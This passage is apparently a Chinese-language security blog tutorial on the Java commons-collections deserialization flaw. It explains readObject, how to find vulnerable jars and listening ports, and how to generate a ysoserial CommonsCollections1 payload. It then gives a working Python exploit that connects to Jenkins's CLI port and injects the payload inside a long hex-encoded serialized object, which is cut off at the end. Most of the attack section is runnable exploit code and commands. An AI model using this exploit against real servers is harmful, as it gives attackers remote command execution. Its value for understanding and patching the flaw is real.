<p>这里“MyObject”实现了“Serializable”接口，自定义了一个方法“readObject”。<br>最后输出的字符串为“bob!”，而“object.ser”文件中字符串仍然为“bob”。由此可知，在java读取完字节流后，会判断是否存在用户自定义的“readObject”方法，如果存在的话，就优先使用udf。<br>所以，如果存在一个自定义了“readObject”方法的对象，而这个方法是危险的，比如说执行系统命令，就会导致反序列化后形成威胁。            </p>
<h2 id="0x01-漏洞寻找方法"><a href="#0x01-漏洞寻找方法" class="headerlink" title="0x01 漏洞寻找方法"></a>0x01 漏洞寻找方法</h2><p>反序列化漏洞存在于commons-collections这个java类库之中，而这个类库到处都在用。。          </p>
<p>1.到应用程序的安装目录下。</p>
<p>2.看程序是不是和“commons-collections”类库绑定。因为该漏洞和一个类“InvokerTransformer”有关，所以直接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@us<span class="operator">-l</span>-breens:~<span class="comment"># cd /opt/OracleHome/</span></span><br><span class="line">root@us<span class="operator">-l</span>-breens:/opt/OracleHome<span class="comment"># grep -R InvokerTransformer .</span></span><br><span class="line">Binary file ./servers/AdminServer/tmp/.appmergegen_1446685824694_jenkins.war/META-INF/.WL_internal/cache/jenkins.war/.classinfos/.cache.ser matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/.appmergegen_1446685824694_jenkins.war/WEB-INF/lib/commons-collections-<span class="number">3.2</span>.<span class="number">1</span>.jar matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/_WL_user/jenkins/tw9byh/META-INF/.WL_internal/cache/jenkins.war/.classinfos/.cache.ser matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/_WL_user/jenkins/<span class="number">3</span>c5quy/war/WEB-INF/lib/commons-collections-<span class="number">3.2</span>.<span class="number">1</span>.jar matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/.appmergegen_1446685776500_jenkins.war/META-INF/.WL_internal/cache/jenkins.war/.classinfos/.cache.ser matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/.appmergegen_1446685776500_jenkins.war/WEB-INF/lib/commons-collections-<span class="number">3.2</span>.<span class="number">1</span>.jar matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/.appmergegen_1446685837432_jenkins.war/META-INF/.WL_internal/cache/jenkins.war/.classinfos/.cache.ser matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/.appmergegen_1446685837432_jenkins.war/WEB-INF/lib/commons-collections-<span class="number">3.2</span>.<span class="number">1</span>.jar matches</span><br><span class="line">Binary file ./oracle_common/modules/com.bea.core.apache.commons.collections.jar matches</span><br><span class="line">Binary file ./oracle_common/modules/com.bea.core.apache.commons.collections.jar.bck matches</span><br></pre></td></tr></table></figure>
<p>到这里只要程序运行时确实是使用了这个jar文件的，攻击就很可能有效。</p>
<p>3.寻找程序把序列化对象当做输入的点。</p>
<p><img src="https://foxglovesecurity.files.wordpress.com/2015/10/objectexample.png" alt=""></p>
<p>上面是两个序列化的java对象，其中一个经过了base64编码，以“rO0AB”开头；另外一个以“ac ed 00 05 ”开头，未经过base64编码，是二进制数据。<br>如果序列化对象作为参数或者cookie经http协议传送，它会被base64编码，此时就注意“rO0AB”字符。但更常见的情况是序列化对象通过其他协议在各种各样的端口上进行传送。这时就需要列出程序监听的端口。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@us<span class="operator">-l</span>-breens:/opt<span class="comment"># lsof -i -P | grep java | grep LISTEN</span></span><br><span class="line">java       <span class="number">6923</span>            root   <span class="number">53</span>u  IPv6 <span class="number">2136625</span>      <span class="number">0</span>t0  TCP *:<span class="number">8080</span> (LISTEN)</span><br><span class="line">java       <span class="number">6923</span>            root   <span class="number">58</span>u  IPv6 <span class="number">2136629</span>      <span class="number">0</span>t0  TCP *:<span class="number">8009</span> (LISTEN)</span><br><span class="line">java       <span class="number">6923</span>            root  <span class="number">125</span>u  IPv6 <span class="number">2138434</span>      <span class="number">0</span>t0  TCP localhost:<span class="number">8005</span> (LISTEN)</span><br><span class="line">java       <span class="number">6923</span>            root  <span class="number">268</span>u  IPv6 <span class="number">2138692</span>      <span class="number">0</span>t0  TCP *:<span class="number">33758</span> (LISTEN)</span><br><span class="line">java       <span class="number">6923</span>            root  <span class="number">272</span>u  IPv6 <span class="number">2137594</span>      <span class="number">0</span>t0  TCP *:<span class="number">53289</span> (LISTEN)</span><br></pre></td></tr></table></figure></p>
<p>接下来便是利用这些端口。试着找一下程序自带的一些脚本或者命令行工具，以此来用Wireshark观察发包收包，像是Jenkins, WebLogic, WebSphere等等都有相应的传送序列化对象的命令行工具。</p>
<p>4.从<a href="http://note.youdao.com/" target="_blank" rel="external">github</a>下载工具“ysoserial”，运行生成对应payload。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar /path/to/ysoserial-<span class="number">0.0</span>.2-SNAPSHOT-all.jar CommonsCollections1 <span class="string">'touch /tmp/pwned'</span> &gt; payload.out</span><br></pre></td></tr></table></figure>
<p>然后使用payload取代对应包中的序列化对象来构造发包。</p>
<h2 id="0x02-实战jenkins"><a href="#0x02-实战jenkins" class="headerlink" title="0x02 实战jenkins"></a>0x02 实战jenkins</h2><p>1.我把应用放在Tomcat里，查找它是否有漏洞库的备份。</p>
<p><img src="http://p1.bqimg.com/4851/05a5b0e02164fed3.png" alt=""><br>2.用“lsof”来看下哪些进程和java相关（有不认识的端口谷歌之）。发现目录“./webapps/jenkins/WEB-INF/”下的工具“jenkins-cli.jar”，是个命令行工具。</p>
<p><img src="http://p1.bqimg.com/4851/efbac6948d951935.png" alt=""><br>3.使用wirshark抓包，观察CLI客户端使用何种协议发包收包，找到序列化对象的位置。</p>
<p><img src="http://i1.piimg.com/567571/6e28055c5c0cc1a8.png" alt=""><br><img src="http://p1.bqimg.com/567571/c3b6dec1e8fd2089.png" alt=""><br>协议大概为：先由CLI客户端发向服务端说明协议类型</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span>  <span class="number">00</span> <span class="number">14</span> <span class="number">50</span> <span class="number">72</span> <span class="number">6</span>f <span class="number">74</span> <span class="number">6</span>f <span class="number">63</span>  <span class="number">6</span>f <span class="number">6</span>c <span class="number">3</span>a <span class="number">43</span> <span class="number">4</span>c <span class="number">49</span> <span class="number">2</span>d <span class="number">63</span> ..Protoc ol:CLI-c</span><br><span class="line"><span class="number">00000010</span>  <span class="number">6</span>f <span class="number">6</span>e <span class="number">6</span>e <span class="number">65</span> <span class="number">63</span> <span class="number">74</span>                                onnect</span><br></pre></td></tr></table></figure>
<p>从服务端读取请求。接着便可以发送第二个包，包里包含了序列化对象，可以对它们进行替换构造发包。</p>
<p>4.利用python构造发包。</p>
<p>利用工具<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="external">ysoserial</a>生成payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-<span class="number">0.0</span>.<span class="number">2</span>-SNAPSHOT-all.jar CommonsCollections1 <span class="string">'touch /tmp/pwned'</span> &gt; payload.out</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#usage: ./jenkins.py host port /path/to/payload</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">host = sys.argv[<span class="number">1</span>]</span><br><span class="line">port = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过HTTP访问jenkins，看服务端是在哪个端口监听CLI发送请求。</span></span><br><span class="line">r = requests.get(<span class="string">'http://'</span>+host+<span class="string">':'</span>+port)</span><br><span class="line">cli_port = int(r.headers[<span class="string">'X-Jenkins-CLI-Port'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#找到CLI对应的端口并进行TCP连接</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">server_address = (host, cli_port)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'connecting to %s port %s'</span> % server_address</span><br><span class="line">sock.connect(server_address)</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送第一个包，说明协议类型</span></span><br><span class="line">headers=<span class="string">'\x00\x14\x50\x72\x6f\x74\x6f\x63\x6f\x6c\x3a\x43\x4c\x49\x2d\x63\x6f\x6e\x6e\x65\x63\x74'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'sending "%s"'</span> % headers</span><br><span class="line">sock.send(headers)</span><br><span class="line"></span><br><span class="line">data = sock.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> &gt;&gt;sys.stderr, <span class="string">'received "%s"'</span> % data</span><br><span class="line"></span><br><span class="line">data = sock.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> &gt;&gt;sys.stderr, <span class="string">'received "%s"'</span> % data</span><br><span class="line"><span class="comment">#返回两个包，收两次</span></span><br><span class="line">payloadObj = open(sys.argv[<span class="number">3</span>],<span class="string">'rb'</span>).read()</span><br><span class="line">payload_b64 = base64.b64encode(payloadObj)</span><br><span class="line">payload=<span class="string">'\x3c\x3d\x3d\x3d\x5b\x4a\x45\x4e\x4b\x49\x4e\x53\x20\x52\x45\x4d\x4f\x54\x49\x4e\x47\x20\x43\x41\x50\x41\x43\x49\x54\x59\x5d\x3d\x3d\x3d\x3e'</span>+payload_b64+<span class="string">'\x00\x00\x00\x00\x11\x2d\xac\xed\x00\x05\x73\x72\x00\x1b\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x4c\x00\x10\x63\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x50\x72\x6f\x78\x79\x74\x00\x30\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x3b\x5b\x00\x07\x72\x65\x71\x75\x65\x73\x74\x74\x00\x02\x5b\x42\x4c\x00\x08\x74\x6f\x53\x74\x72\x69\x6e\x67\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x49\x00\x02\x69\x64\x49\x00\x08\x6c\x61\x73\x74\x49\x6f\x49\x64\x4c\x00\x08\x72\x65\x73\x70\x6f\x6e\x73\x65\x74\x00\x1a\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x73\x70\x6f\x6e\x73\x65\x3b\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x09\x63\x72\x65\x61\x74\x65\x64\x41\x74\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x3b\x78\x70\x73\x72\x00\x1e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x24\x53\x6f\x75\x72\x63\x65\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x06\x74\x68\x69\x73\x24\x30\x74\x00\x19\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x43\x6f\x6d\x6d\x61\x6e\x64\x3b\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\xd0\xfd\x1f\x3e\x1a\x3b\x1c\xc4\x02\x00\x00\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\xd5\xc6\x35\x27\x39\x77\xb8\xcb\x03\x00\x04\x4c\x00\x05\x63\x61\x75\x73\x65\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\x3b\x4c\x00\x0d\x64\x65\x74\x61\x69\x6c\x4d\x65\x73\x73\x61\x67\x65\x71\x00\x7e\x00\x03\x5b\x00\x0a\x73\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x74\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x4c\x00\x14\x73\x75\x70\x70\x72\x65\x73\x73\x65\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x74\x00\x10\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4c\x69\x73\x74\x3b\x78\x70\x71\x00\x7e\x00\x10\x70\x75\x72\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x02\x46\x2a\x3c\x3c\xfd\x22\x39\x02\x00\x00\x78\x70\x00\x00\x00\x0c\x73\x72\x00\x1b\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x61\x09\xc5\x9a\x26\x36\xdd\x85\x02\x00\x04\x49\x00\x0a\x6c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x4c\x00\x0e\x64\x65\x63\x6c\x61\x72\x69\x6e\x67\x43\x6c\x61\x73\x73\x71\x00\x7e\x00\x03\x4c\x00\x08\x66\x69\x6c\x65\x4e\x61\x6d\x65\x71\x00\x7e\x00\x03\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x71\x00\x7e\x00\x03\x78\x70\x00\x00\x00\x43\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x74\x00\x0c\x43\x6f\x6d\x6d\x61\x6e\x64\x2e\x6a\x61\x76\x61\x74\x00\x06\x3c\x69\x6e\x69\x74\x3e\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x32\x71\x00\x7e\x00\x15\x71\x00\x7e\x00\x16\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x63\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x74\x00\x0c\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x3c\x74\x00\x1b\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x74\x00\x10\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x03\x08\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x68\x61\x6e\x6e\x65\x6c\x74\x00\x0c\x43\x68\x61\x6e\x6e\x65\x6c\x2e\x6a\x61\x76\x61\x74\x00\x04\x63\x61\x6c\x6c\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xfa\x74\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x74\x00\x1c\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x2e\x6a\x61\x76\x61\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x24\x50\x72\x6f\x78\x79\x31\x70\x74\x00\x0f\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x74\x00\x15\x77\x61\x69\x74\x46\x6f\x72\x52\x65\x6d\x6f\x74\x65\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x74\x00\x0e\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x74\x00\x08\x43\x4c\x49\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x74\x00\x1f\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x74\x00\x19\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x2e\x6a\x61\x76\x61\x74\x00\x07\x63\x6f\x6e\x6e\x65\x63\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x74\x00\x05\x5f\x6d\x61\x69\x6e\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x74\x00\x04\x6d\x61\x69\x6e\x73\x72\x00\x26\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x4c\x69\x73\x74\xfc\x0f\x25\x31\xb5\xec\x8e\x10\x02\x00\x01\x4c\x00\x04\x6c\x69\x73\x74\x71\x00\x7e\x00\x0f\x78\x72\x00\x2c\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x19\x42\x00\x80\xcb\x5e\xf7\x1e\x02\x00\x01\x4c\x00\x01\x63\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x3b\x78\x70\x73\x72\x00\x13\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x41\x72\x72\x61\x79\x4c\x69\x73\x74\x78\x81\xd2\x1d\x99\xc7\x61\x9d\x03\x00\x01\x49\x00\x04\x73\x69\x7a\x65\x78\x70\x00\x00\x00\x00\x77\x04\x00\x00\x00\x00\x78\x71\x00\x7e\x00\x3c\x78\x71\x00\x7e\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x70\x73\x7d\x00\x00\x00\x02\x00\x2e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x00\x1c\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x49\x52\x65\x61\x64\x52\x65\x73\x6f\x6c\x76\x65\x78\x72\x00\x17\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x50\x72\x6f\x78\x79\xe1\x27\xda\x20\xcc\x10\x43\xcb\x02\x00\x01\x4c\x00\x01\x68\x74\x00\x25\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x78\x70\x73\x72\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x00\x00\x00\x00\x00\x00\x00\x01\x03\x00\x05\x5a\x00\x14\x61\x75\x74\x6f\x55\x6e\x65\x78\x70\x6f\x72\x74\x42\x79\x43\x61\x6c\x6c\x65\x72\x5a\x00\x09\x67\x6f\x69\x6e\x67\x48\x6f\x6d\x65\x49\x00\x03\x6f\x69\x64\x5a\x00\x09\x75\x73\x65\x72\x50\x72\x6f\x78\x79\x4c\x00\x06\x6f\x72\x69\x67\x69\x6e\x71\x00\x7e\x00\x0d\x78\x70\x00\x00\x00\x00\x00\x02\x00\x73\x71\x00\x7e\x00\x0b\x71\x00\x7e\x00\x43\x74\x00\x78\x50\x72\x6f\x78\x79\x20\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x40\x32\x20\x77\x61\x73\x20\x63\x72\x65\x61\x74\x65\x64\x20\x66\x6f\x72\x20\x69\x6e\x74\x65\x72\x66\x61\x63\x65\x20\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x75\x71\x00\x7e\x00\x11\x00\x00\x00\x0d\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x7d\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x89\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x74\x00\x04\x77\x72\x61\x70\x73\x71\x00\x7e\x00\x13\x00\x00\x02\x6a\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x74\x00\x06\x65\x78\x70\x6f\x72\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x02\xa6\x74\x00\x21\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x74\x00\x16\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x4a\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x46\x71\x00\x7e\x00\x1d\x71\x00\x7e\x00\x1e\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x03\x08\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x71\x00\x7e\x00\x22\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xfa\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x71\x00\x7e\x00\x26\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x71\x00\x7e\x00\x28\x70\x71\x00\x7e\x00\x29\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x71\x00\x7e\x00\x2b\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x71\x00\x7e\x00\x30\x71\x00\x7e\x00\x31\x71\x00\x7e\x00\x32\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x34\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x36\x71\x00\x7e\x00\x3a\x78\x78\x75\x72\x00\x02\x5b\x42\xac\xf3\x17\xf8\x06\x08\x54\xe0\x02\x00\x00\x78\x70\x00\x00\x07\x46\xac\xed\x00\x05\x73\x72\x00\x32\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x24\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x04\x49\x00\x03\x6f\x69\x64\x5b\x00\x09\x61\x72\x67\x75\x6d\x65\x6e\x74\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x05\x74\x79\x70\x65\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x77\x08\xff\xff\xff\xfe\x00\x00\x00\x02\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x49\x00\x02\x69\x64\x49\x00\x08\x6c\x61\x73\x74\x49\x6f\x49\x64\x4c\x00\x08\x72\x65\x73\x70\x6f\x6e\x73\x65\x74\x00\x1a\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x73\x70\x6f\x6e\x73\x65\x3b\x77\x04\x00\x00\x00\x00\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x09\x63\x72\x65\x61\x74\x65\x64\x41\x74\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x3b\x77\x04\x00\x00\x00\x00\x78\x70\x73\x72\x00\x1e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x